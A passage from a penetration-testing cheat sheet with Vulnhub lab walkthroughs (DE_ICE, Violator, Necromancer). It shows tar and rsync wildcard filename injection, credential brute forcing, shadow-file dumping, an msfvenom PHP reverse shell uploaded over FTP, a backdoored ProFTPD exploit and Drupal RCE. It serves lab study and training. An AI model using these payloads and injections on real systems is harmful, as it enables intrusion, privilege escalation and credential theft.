total 72
drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
```
Now, for example, root user wants to create archive of all files in current directory.
```
[root@defensecode public]# tar cf archive.tar *

uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command
execution under root privileges.
Once again, there are few files created by user 'leon'. 
```
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
```
Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.
```
[root@defensecode public]# cat shell.sh
/usr/bin/id
```
So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the 'root' account above.
</li>

<li><strong>Rsync arbitrary command execution</strong>

Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very common on Unix systems. If we check 'rsync' manual page, we can again find options that can be abused for arbitrary command execution.

Rsync manual:
"You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote."

Interesting rsync option from manual:
```
 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

Let's abuse one example directly from the 'rsync' manual page. Following example will copy all C files in local directory to a remote host 'foo' in '/src' directory.
```
# rsync -t *.c foo:src/
```
Directory content:
```
[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
```
Now root will try to copy all C files to the remote server.
```
[root@defensecode public]# rsync -t *.c foo:src/

rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]
```
Let's see what happened...
```
[root@defensecode public]# ls -al
total 76
drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
```
There were two files owned by user 'leon', as listed below.
```
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
```
After 'rsync' execution, new file shell_output.txt whose owner is root is created in same directory.
```
-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
```
If we check its content, following data is found.
```
[root@defensecode public]# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
Trick is that because of the '*.c' wildcard, 'rsync' got '-e sh shell.c' option on command line, and shell.c will be executed upon 'rsync' start.
Content of shell.c is presented below.
```
[root@defensecode public]# cat shell.c
/usr/bin/id > shell_output.txt
```
</li>
</ul>
</ol>

<strong>Tips and Tricks:</strong>
<ol>
<li>run-parts: run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
```
run-parts /etc/cron.daily
```
</li>
<li>Sudoers file:
if the sudoers file contains:
```
secure_path
Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.

env_reset
If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

mail_badpass
Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.
```</li>
<li>XSS/ HTML Injection:

The below will redirect the page to google.com
```
<META http-equiv="refresh" content="0;URL=http://www.google.com">
```</li>
<li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password. </li>
<li>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</li>

<li>Identification of OS:
```
cat /etc/os-release

NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial

```</li>

<li>Java keystore file: https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores and https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats</li>
<li>Cracking MD5 Hashes: Try https://crackstation.net/</li>
<li>Find files by wheel/ adm users.</li>
<li>Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist</li>
<li>When you see something like this "Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. 

The way it is implemented is by use of .htaccess file
```
cat .htaccess 
BrowserMatchNoCase "iPhone" allowed

Order Deny,Allow
Deny from ALL
Allow from env=allowed
ErrorDocument 403 "<H1>Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>"
```</li>
<li>Port 139 Open
```
smbclient -N -L 192.168.1.2
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Server               Comment
	---------            -------
	RED                  red server (Samba, Ubuntu)

	Workgroup            Master
	---------            -------
	WORKGROUP            RED

-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password.
-L|--list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
```
If you want to access the share you might want to type:
```
smbclient \\\\IP\\share_name

So, in the above example, it would be

smbclient \\\\192.168.1.2\\kathy
```
If port 139 is open, also run enum4linux, may be it would help get the user list
</li>
<li>
curl
```
       -k, --insecure
              (SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
              This makes all connections considered "insecure" fail unless -k, --insecure is used.

       -I, --head
              (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size
              and last modification time only.


```</li>
<li>Port 69 UDP:
TFTP
```
get or put file
```</li>

<li>
Ruby Best way to get quoted words / phrases out of the text:

```
text.scan(/"([^"]*)"/)
```
</li>
<li>
Convert all text in a file from UPPER to lowercase
```
tr '[:upper:]' '[:lower:]' < input.txt > output.txt
```
Remove lines longer than x or shorter than x
```
awk 'length($0)>x' filename
or
awk 'length($0)<x' filename
```</li>

<li>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in Breach 2)), we can upgrade it to meterpreter by using sessions -u
```
sessions -h
Usage: sessions [options]

Active session manipulation and interaction.

OPTIONS:

    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
```
</li>

<li>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.
```
## Tighten security after security incident
## root never gets to log in remotely
PermitRootLogin no
## Eugene & Margo can SSH in, no-one else allowed
AllowUsers eugene margo
## SSH keys only but margo can use a password
Match user margo
    PasswordAuthentication yes
## End tighten security
```</li>
<li>Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</li>
<li>If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.
```
13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
13:06:21.991250 Authentication (Open System)-1: Successful
13:06:21.992274 Authentication (Open System)-1: Successful
13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.992795 Authentication (Open System)-2: 
13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
```
</li>
<li>Transfer a image:
```
base64 flair.jpg
Copy output
vi flair
Paste the clipboard
base64 -d flair > flair.jpg
```</li>
<li>It's always important to find, what's installed on the box:
```
dpkg-query -l 
```
or using wild cards
```
dpkg-query -l 'perl*'
```
</li>
<li>Password Protected File:
<ul>x
<li>
ZIP File: run fcrackzip
```
fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

-D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
-p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
-u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.
```
</li>
<li>
We can get the password hash of a password protected rar file by using rar2john
```
[root:~/Downloads]# rar2john crocs.rar
file name: artwork.jpg
crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
```
</li>
</ul>
</li>
<li>Data-URI: https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs</li>
<li>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.
```
ssh -D localhost:9050 user@host

     -D [bind_address:]port
             Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection
             is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5
             protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.


```
and 
```
proxychains4 remmina
```</li>
<li>If you have sql-shell from sqlmap, we can use 
```
select load_file('/etc/passwd');
```
</li>
<li>If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.
```
truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>
```
and Veracrypt to open the file.</li>
<li>Getting a reverse shell from:

Drupal:

Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module.Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text format"

Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down.

Taken from https://g0blin.co.uk/droopy-vulnhub-writeup/

Drupal settings file location: /var/www/html/sites/default/settings.php</li>

<li>
If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
</li>
</lu>
</ol>
</li>

<ol>
Write-Ups of Vulnhub VM:
<li><strong>DE_ICE_S1_100</strong>: 

Scenario provided on Vulnhub: The scenario for this LiveCD is that a CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn't believe the company is insecure, he has contracted you to look at only one server - a old system that only has a web-based list of the company's contact information.

The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.

Information provided on the webpage:
```
Here is a list of contact information for the various organizational bodies:
FINANCIAL: For Problems with financial issues, please contact the HR Department:
Head of HR: Marie Mary - marym@herot.net (On Emergency Leave)
Employee Pay: Pat Patrick - patrickp@herot.net
Travel Comp: Terry Thompson - thompsont@herot.net
Benefits: Ben Benedict - benedictb@herot.net

ENGINEERING: For the Engineering Department, we have the following information:
Director of Engineering: Erin Gennieg - genniege@herot.net
Project Manager: Paul Michael - michaelp@herot.net
Engineer Lead: Ester Long - longe@herot.net

If you have any problems with this server, or need to change information, please contact the following people:
Sr. System Admin: Adam Adams - adamsa@herot.net
System Admin (Intern): Bob Banter - banterb@herot.net
System Admin: Chad Coffee - coffeec@herot.net
```

Let's see what we can find, so here we get a list of name of few people in the organization from Financial, Engineering department. We also get the people whom to contact if there's any problem with this server which is
```
Sr. System Admin: Adam Adams - adamsa@herot.net
System Admin (Intern): Bob Banter - banterb@herot.net
System Admin: Chad Coffee - coffeec@herot.net
```
Now, based on Name, usernames can be created using superkojiman namemash script. However, in this case there are lot of person and lot of possible username. So, we need to think who are important users which will be the System administrators. Also, by the concept of new people don't know much about security and might have default passwords. Let's target the intern Bob Banter.

Running superkojiman namemash script on Bob Banter, we get
```
python namemash.py name
bobbanter
banterbob
bob.banter
banter.bob
banterb
bbanter
bbob
b.banter
b.bob
bob
banter
```
Now Let's see what are the open ports on the host:
```
21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp?
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
110/tcp open   pop3     Openwall popa3d
143/tcp open   imap     UW imapd 2004.357
```
Brute force attack can be executed on ssh and pop3. Running ssh brute force / pop3 brute results in 
```
192.168.1.100  192.168.1.100  110/tcp (pop3)  bbanter  bbanter             Password
192.168.1.100  192.168.1.100  22/tcp (ssh)    bbanter  bbanter             Password
```

Logging in as a bbanter user and checking /etc/passwd and /etc/group file 
```
aadams:x:1000:10:,,,:/home/aadams:/bin/bash
bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
```
```
root::0:root
wheel::10:root
users::100:
console::101:
```
We see found the actual usernames which can be brute forced, we also see that aadams is member of group 10 which is group named wheel.

So what's wheel group?
<ul>
<li>Control of su in PAM: If you want to protect su, so that only some people can use it to become root on your system, you need to add a new group "wheel" to your system (that is the cleanest way, since no file has such a group permission yet). Add root and the other users that should be able to su to the root user to this group. Then add the following line to /etc/pam.d/su:
```
       auth        requisite   pam_wheel.so group=wheel debug
```
This makes sure that only people from the group "wheel" can use su to become root. Other users will not be able to become root. In fact they will get a denied message if they try to become root</li>
</ul>
which essentially means we need to get password of aadams to become root. Other users (ccoffee or bbanter) won't be able to run su. Running the bruteforce attack on aadams, ccoffee by using rockyou/darkc0de, we get
```
192.168.1.100  192.168.1.100  110/tcp (pop3)  aadams   nostradamus         Password
```
Logging as aadams and using sudo, we can extract passwd and shadow file, combine them using unshadow and use john to crack it.
```
aadams@slax:~$ id
uid=1000(aadams) gid=10(wheel) groups=10(wheel)
aadams@slax:~$ sudo cat /etc/shadow
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
```
```
unshadow PASSWD-FILE SHADOW FILE
unshadow passwd shadow 
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:1000:10:,,,:/home/aadams:/bin/bash
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:1002:100:,,,:/home/ccoffee:/bin/bash
```
</li>

<li>
<br>
<strong>Violator:</strong>
Nmap scans provides
```
nmap -p- -A 192.168.56.102 -oA Violator -vv

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5rc3
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: I Say... I say... I say Boy! You pumpin' for oil or somethin'...?

```

Searching proftpd 1.3.5 in searchsploit provides you a exploit
```
ProFTPd 1.3.5 - File Copy                                                                                                                                                                     | ./linux/remote/36742.txt
ProFTPd 1.3.5 (mod_copy) - Remote Command Execution                                                                                                                                           | ./linux/remote/36803.py
ProFTPD 1.3.5 - Mod_Copy Command Execution                                                                                                                                                    | ./linux/remote/37262.rb
```
Metasploit has a module which provides a shell
```

```
On the webserver, we found a link to the wiki of Violator https://en.wikipedia.org/wiki/Violator_%28album%29. If we use cewl to generate a wordlist on the wiki, it will generate only one word list for example if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code and removing spaces and changing upper to lower, we were able to create a small wordlist of 400 words.
```
awk 'length($0)<20' quotes | awk 'length($0)>4' | sed 's/ //gi'| tr '[:upper:]' '[:lower:]' > wordlist.txt
```
Using hydra to brute force the accounts
```
hydra -L usernames.txt -P wordlist.txt ftp://192.168.1.2
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-29 01:31:29
[DATA] max 16 tasks per 1 server, overall 64 tasks, 570 login tries (l:5/p:114), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.1.2   login: dg   password: policyoftruth
[21][ftp] host: 192.168.1.2   login: af   password: enjoythesilence
[21][ftp] host: 192.168.1.2   login: mg   password: bluedress
[21][ftp] host: 192.168.1.2   login: aw   password: sweetestperfection
1 of 1 target successfully completed, 5 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-29 01:31:43
```
We can upload a php meterpreter reverse shell by using ftp 
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 R > payload.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 947 bytes
```
```
ftp 192.168.1.2
Connected to 192.168.1.2.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.2]
Name (192.168.1.2:xx): dg
331 Password required for dg
Password:
230 User dg logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /var/www/html
250 CWD command successful
ftp> put payload.php
local: payload.php remote: payload.php
200 PORT command successful
150 Opening BINARY mode data connection for payload.php
226 Transfer complete
947 bytes sent in 0.00 secs (37.6304 MB/s)
```
Setting up a exploit handler at LPORT 4444 and visiting the payload provides us the meterpreter shell. By logging to dg, we can see the sudo permissions of dg
```
dg@violator:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd

```
We should be able to run proftpd present at /home/dg/bd/sbin/proftpd with root permissions. On checking the proftpd.conf, we found out that the proftpd runs on port 2121 and only on localhost.
```
cat proftpd.conf
cat proftpd.conf
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"Depeche Mode Violator Server"
ServerType			standalone
DefaultServer			on

# Belt up son!
SocketBindTight			on

# Port 21 is the standard FTP port.
Port				2121

# Listen onnly on lo
DefaultAddress			127.0.0.1
```
On connecting 
```
ftp localhost 2121
Connected to localhost.
220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]
```
The FTP Server is ProFTPD 1.3.3c which is backdoored ( found by using searchsploit ).

As we have the meterpreter shell, we can portfwd our connection to Violater port 2121
```
 portfwd add 192.168.1.1 -l 2121 -r 127.0.0.1 -p 2121
[*] Local TCP relay created: :2121 <-> 127.0.0.1:2121
```
and execute the msf proftpd_133c_backdoor module to get a root shell :)

Once you get the root shell, in the /root folder, there's a password protected rar file, crackable by using the wordlist generated by cewl with quotes included. 
New thing to learn by rar2john which generates a hash of rar password. :)
</li>

<li>
<strong>Necromancer</strong>:
On TCP Port scanning the Necromancer:
```
# Nmap 7.12 scan initiated Fri Jul 15 14:44:47 2016 as: nmap -p- -n -oA Necro -vv 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00020s latency).
All 65535 scanned ports on 192.168.56.101 are filtered because of 65535 no-responses
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul 15 15:06:41 2016 -- 1 IP address (1 host up) scanned in 1314.06 seconds
```
On UDP Port Scanning:
```
# Nmap 7.12 scan initiated Fri Jul 15 15:07:11 2016 as: nmap -p- -n -oA Necro_UDP -vv -sU 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00048s latency).
Scanned at 2016-07-15 15:07:11 IST for 1136s
Not shown: 65534 open|filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE REASON
666/udp open  doom    udp-response ttl 64
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul 15 15:26:07 2016 -- 1 IP address (1 host up) scanned in 1136.35 seconds

```
On listenting on the interface vboxnet0,

we find the VM broadcast some data on port 4444
```
18:27:04.271798 IP 192.168.56.101.42138 > 192.168.56.1.4444: Flags [S], seq 1419283988, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2605474657 ecr 0], length 0
18:27:04.271828 IP 192.168.56.1.4444 > 192.168.56.101.42138: Flags [R.], seq 0, ack 1419283989, win 0, length 0
18:27:04.275580 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:27:04.275588 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:27:04.281290 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
18:27:04.281298 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
18:27:04.285544 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
18:27:04.285555 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
18:27:04.290284 ARP, Request who-has 192.168.56.6 tell 192.168.56.101, length 28
```
On listening on the port 4444 on 192.168.56.1
```
nc -lvp 4444
listening on [any] 4444 ...
